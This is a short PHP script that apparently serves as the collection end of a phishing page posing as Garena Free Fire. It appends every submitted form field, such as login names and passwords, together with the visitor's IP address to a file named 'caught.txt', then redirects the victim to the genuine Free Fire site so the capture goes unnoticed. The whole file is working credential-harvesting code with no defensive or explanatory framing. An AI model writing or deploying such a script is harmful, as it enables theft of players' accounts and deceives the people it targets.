<?php
header("Location: https://freefire.garena.com");
$file = fopen("caught.txt", "a");
foreach ($_POST as $key => $value) {
    fwrite($file, "$key: $value\n");
}
fwrite($file, "IP: " . $_SERVER['REMOTE_ADDR'] . "\n");
fwrite($file, "----\n");
fclose($file);
exit;
?>